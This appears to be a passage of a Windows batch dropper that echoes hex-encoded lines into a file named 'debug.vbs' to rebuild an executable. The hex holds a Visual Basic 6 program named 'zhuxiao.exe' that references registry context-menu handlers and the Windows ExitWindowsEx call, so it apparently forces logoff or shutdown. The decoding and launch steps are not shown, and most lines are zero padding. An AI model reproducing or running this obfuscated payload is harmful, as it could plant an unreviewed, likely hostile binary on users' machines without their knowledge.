@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"FCB148738D6948736E9849739E104973B0DB3B734E624873D568487324734673026248739A6248739A63487364B34873AF443B736FD83A73E6BB497378B73A738A69487385E33B7309B448737C6746735B4E3B731D6648734E6348737F9D497369954773A1B24873CE624873CE634873026348733D5D48733EDE397377954773"_>>debug.vbs
@echo +"36B83A733C14497336B14873EA204873BAB44873350F4873FE473B7300000000070008008C1C4000A61C4000931C4000FF2530104000FF2550104000FF255C104000FF2524104000FF2520104000FF2568104000FF2514104000FF2574104000FF2528104000FF2570104000FF256C104000FF2558104000FF2540104000FF25"_>>debug.vbs
@echo +"54104000FF2518104000FF2504104000FF2588104000FF2500104000FF2594104000FF2564104000FF252C104000FF2548104000FF2590104000FF258C104000FF253C104000FF250C104000FF2510104000FF2560104000FF2538104000FF2598104000FF2584104000FF251C104000FF2580104000FF257C104000FF250810"_>>debug.vbs
@echo +"4000FF254C104000FF2534104000FF2544104000FF2578104000000068F4124000E8EEFFFFFF000000000000300000003800000000000000BC2FD2748087EF44903BE3B14A44E3B300000000000001000000000000000000D7D3B3CCD0F2000000000000FFCC310000709A20263B0CF2438C3AFC954D9DD91A356FC1169A4C7F"_>>debug.vbs
@echo +"4AA6BE629522BB24E93A4FAD339966CF11B70C00AA0060D393000000000000000000000000000000000000000000000000000000000000000000000000540000004F000000000500466F726D31000D010500466F726D310003050000800A011901004200220123FFFFFFFF240500466F726D31002600270028002E0035803400"_>>debug.vbs
@echo +"00092400003A0200001E0000004100FF0400000007000000FC18400007000000A818400050000000709A20263B0CF2438C3AFC954D9DD91A0000000000000000000000000000000000000000100000000000000000000000000000000000000000000000AD00000000000000E41140004C00000056423521F01F766236636873"_>>debug.vbs
@echo +"2E646C6C000000002A000000000000000000000000000A00040800000000000000000000DC14400000F0300000FFFFFF080000000100000001000000E9000000A412400094124000A811400078000000800000008600000087000000000000000000000000000000000000007A68757869616F00B9A4B3CC310000D7D3B3CCD0"_>>debug.vbs
@echo +"F2000000010000001817400000000000F41A4000FFFFFFFF000000006C1740000830400002000000FC134000000000000000000000000000FC13400001000000C81740000000000004144000010000000C1440000000000008144000010000000C1440000100B70168006C0034144000F032400000000000DCDA1E0000000000"_>>debug.vbs
@echo +"00000000D8174000E817400040001F0034000000F8174000FFFFFFFF000000000000000038144000D8DE1E0008184000FFFFFFFFD4144000000000000C1440008413400082114000881140008E114000000000000000000000000000000000000000000000000000CC1440000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000816C240433000000E977060000000000F40100001817400000000000401B4000E01C4000F009000008304000B610400000304000"_>>debug.vbs
@echo +"2A005C0041004B003A005C0058005000F3532E956962555CBE8B6E7F0759FD4E5C00505B0B7A8F5E5C00505B0B7A8F5E2E00760062007000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000009412400002000000000000002C304000C01A4000FFFFFFFF000000001C30400042A06177F52734469091C48EE1DD76000A000100010001006C174000000000000000000000000000B01740000904000004080000000000000200000084134000FFFFFFFF301940000000000000000000"_>>debug.vbs
@echo +"00000000A8174000030000009C174000FFFF00008380010000000000B7664FC1B7664FC1B7664FC1466F726D31000000D7D3B3CCD0F20000356FC1169A4C7F4AA6BE629522BB24E94F6F9B3F6A36DD43BC10ADAE3408E5EE709A20263B0CF2438C3AFC954D9DD91A6154AEB68789974FBD3A56BC08D143893A4FAD339966CF11"_>>debug.vbs
@echo +"B70C00AA0060D393466F726D000000002E3DFBFCFAA06810A73808002B3371B5433A5C50726F6772616D2046696C65735C4D6963726F736F66742056697375616C2053747564696F5C564239385C5642362E4F4C4200000056420000101840000000000006000000090000002018400058184000D03240000000000000000000"_>>debug.vbs
@echo +"B8961A000D00000061647661706933322E646C6C000000000C0000005265674F70656E4B65794100881840009C18400000000400D43240000000000000000000A1DC3240000BC07402FFE068A8184000B840114000FFD0FFE00000000700000075736572333200000E0000004578697457696E646F77734578000000E0184000"_>>debug.vbs
@echo +"EC18400000000400E03240000000000000000000A1E83240000BC07402FFE068FC184000B840114000FFD0FFE00000000C0040000000000000000000980000002A005C007300680065006C006C00650078005C0043006F006E0074006500780074004D0065006E007500480061006E0064006C006500720073005C007B003000"_>>debug.vbs
@echo +"30003000300030003000300030002D006B0069006E0067002D006B0069006E0067002D0032003200300030002D003000300030003000300030003000300030003000300030007D005C0046006F006C006400650072005C0000000000564241362E444C4C000000005F5F76626146726565566172000000005F5F766261456E64"_>>debug.vbs
@echo +"000000005F5F766261493256617200005F5F76626156617254737445710000005F5F76626146726565537472000000005F5F766261566172436F7079000000005F5F76626153657453797374656D4572726F72005F5F766261537472546F416E736900005F5F766261493456617200005F5F7662615661724D6F766500000000"_>>debug.vbs
@echo +"F41A40000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000018174000FFFFFFFF00000000801A4000000000000000000000000000FFFFFFFF000000005C184000F8174000EC3240000000000084134000FFFFFFFF"_>>debug.vbs
@echo +"000000000C00000000000000841A400000000000901A4000801A4000801A40000000000000000000000000004000000004000000CCCCCCCCCCCCCCCCCCCCCCCCE9E9E9E9CCCCCCCCCCCCCCCCCCCCCCCC558BEC83EC0C68B610400064A100000000506489250000000081EC880000005356578965F4C745F8A01040008B45088B"_>>debug.vbs
@echo +"C883E101894DFC24FE508945088B10FF52048D45BC33F6508975DC8975CC8975BC8975AC8975A889759889758889B578FFFFFF89B570FFFFFFFF157C1040008D8D70FFFFFF8D55A851684019400052898570FFFFFFFF1580104000506800000080E8DAFCFFFF8B1D1C1040008BF8FFD38B8570FFFFFF8D55888D4DBC894590C7"_>>debug.vbs
@echo +"458803000000FF1584104000897D808B3D081040008D9578FFFFFF8D4DDCC78578FFFFFF03000000FFD78D4DA8FF15981040008D4DDC8D55885152897590C7458802800000FF15381040006685C074338D45AC5650FF156010400050E8B3FCFFFF898574FFFFFFFFD3668B8D74FFFFFF8D558866894D908D4DCCC74588020000"_>>debug.vbs
@echo +"00FFD7FF15101040008975FC68C11C4000EB138D4DA8FF15981040008D4D98FF150C104000C38B350C1040008D4DDCFFD68D4DCCFFD68D4DBCFFD68D4DACFFD6C38B4508508B10FF52088B45FC8B4DEC5F5E64890D000000005B8BE55DC204009E9E9E9E0C1D0000FFFFFFFFFFFFFFFFAC1D0000001000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000BA1D0000C41D0000D21D0000E21D0000F21D0000FE1D00000E1E00001C1E0000321E0000421E0000541E0000661E0000701E00007E1E0000921E0000A21E0000B41E0000C21E0000D81E0000E21E0000FE1E0000141F0000221F0000341F0000481F0000561F0000601F0000721F0000841F0000"_>>debug.vbs
@echo +"961F000064000080A41F0000B21F0000C41F0000D41F0000DE1F0000E81F0000F21F0000FC1F0000000000004D535642564D36302E444C4C000000005F4349636F73000000005F61646A5F667074616E000000005F5F7662615661724D6F7665000000005F5F76626146726565566172000000005F5F766261456E6400000000"_>>debug.vbs
@echo +"5F61646A5F666469765F6D36340000005F61646A5F667072656D310000005F5F76626153657453797374656D4572726F720000005F61646A5F666469765F6D33320000005F61646A5F666469765F6D313669000000005F61646A5F66646976725F6D3136690000005F434973696E000000005F5F76626143686B73746B000000"_>>debug.vbs
@echo +"4556454E545F53494E4B5F4164645265660000005F5F7662615661725473744571000000446C6C46756E6374696F6E43616C6C0000005F61646A5F66706174616E0000004556454E545F53494E4B5F52656C65617365000000005F4349737172740000004556454E545F53494E4B5F5175657279496E74657266616365000000"_>>debug.vbs
@echo +"5F5F76626145786365707448616E646C6572000000005F61646A5F667072656D000000005F61646A5F66646976725F6D3634000000005F5F7662614650457863657074696F6E000000005F5F7662614932566172000000005F43496C6F67000000005F61646A5F666469765F6D333269000000005F61646A5F66646976725F6D"_>>debug.vbs
@echo +"3332690000005F61646A5F66646976725F6D3332000000005F61646A5F666469765F720000005F5F7662614934566172000000005F5F766261537472546F416E7369000000005F5F766261566172436F7079000000005F43496174616E0000005F616C6C6D756C0000005F434974616E000000005F4349657870000000005F5F"_>>debug.vbs
@echo +"7662614672656553747200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000006447B445000000000000030003000000580000800E000000400000801000000028000080000000006447B44500000000000001000100000080000080000000006447B44500000000000001000100000098000080000000006447B445000000000000030031750000E000008032750000C800008033750000B0000080"_>>debug.vbs
@echo +"000000006447B445000000000000010004080000F8000000000000006447B44500000000000001000000000008010000000000006447B44500000000000001000000000018010000000000006447B44500000000000001000000000028010000000000006447B44500000000000001000000000038010000504100002C020000"_>>debug.vbs
@echo +"B0040000000000007C43000030000000B004000000000000AC43000028010000B004000000000000D4440000E8020000B004000000000000BC47000030010000B00400000000000000000000000000002C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100"_>>debug.vbs
@echo +"0000010000000000000001000000000000000000000000000400000001000000000000000000000000000000440000000000560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000408B0048C010000010053007400720069006E00"_>>debug.vbs
@echo +"6700460069006C00650049006E0066006F0000006801000001003000380030003400300034004200300000002C000C00010043006F006D00700061006E0079004E0061006D00650000000000E86C0095A18B977B3A67000030000C0001004C006500670061006C0043006F00700079007200690067006800740000000F5CD191"_>>debug.vbs
@echo +"E55D5C4FA45B0000280008000100500072006F0064007500630074004E0061006D00650000000000E55D0B7A310000002C000A000100460069006C006500560065007200730069006F006E000000000031002E00300030000000000030000A000100500072006F006400750063007400560065007200730069006F006E000000"_>>debug.vbs
@echo +"31002E00300030000000000030001000010049006E007400650072006E0061006C004E0061006D00650000007A00680075007800690061006F0000004000180001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000007A00680075007800690061006F002E00650078006500000000000100"_>>debug.vbs
@echo +"030020200200010001003001000031752020100001000400E8020000327510101000010004002801000033752800000010000000200000000100040000000000C0000000000000000000000000000000000000000000000000008000008000000080800080000000800080008080000080808000C0C0C0000000FF0000FF0000"_>>debug.vbs
@echo +"00FFFF00FF000000FF00FF00FFFF0000FFFFFF000000000000000000000000000000000000000000000000000000000008F07700000008FFFFF07770000FFFFFFFF07000000FFFFFFFF00000000FFFFFFFF00000000FFFFF80000000000F80000EE0000000000EEEE0000000000EE00000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000FFFF0000FFFF0000FF8F0000F8030000C0010000C0070000C00F0000C00F0000C00F0000C00F0000C00F0000C07F0000C7FF0000FFFF0000FFFF0000FFFF00002800000020000000400000000100040000000000800200000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"00008000008000000080800080000000800080008080000080808000C0C0C0000000FF0000FF000000FFFF00FF000000FF00FF00FFFF0000FFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000008FFF0770000000000000000000008FFFFFFF07777000000000000008FFFFFFFFFFFF0777777000000000FFFFFFFFFFFFFFFF0777700000000000FFFFFFFFFFFFFFFF0770000000000000FFFFFFFFFFFFFFFF0000000000000000FF"_>>debug.vbs
@echo +"FFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFF88880000000000000000FFFFFFFF888800000000000000000000FF"_>>debug.vbs
@echo +"FF88880000EEEE000000000000000088880000EEEE000000000000000000000000EEEE000000000000000000000000EEEE00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC1FFFFFC007FFF80001FF8000007F800001FF800007FF80001FFF80001FFF80001FFF80001FFF80001FFF80001FF"_>>debug.vbs
@echo +"F80001FFF80001FFF80001FFF80001FFF80001FFF8003FFFF803FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF2800000020000000400000000100010000000000000100000000000000000000000000000000000000000000FFFFFF00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFC1FFFFFC3C7FFFC3FC1FF83FFC07FBFFFC1FFBFFFC7FFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFFDFFFBFFC1FFFBFC3DFFFBC3C1FFF83C3FFFFBC3FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFC1FFFFFC007FFFC0001FF8000007F800001FF800007FF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF80001FFF8003FFFF803FFFFF83FFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
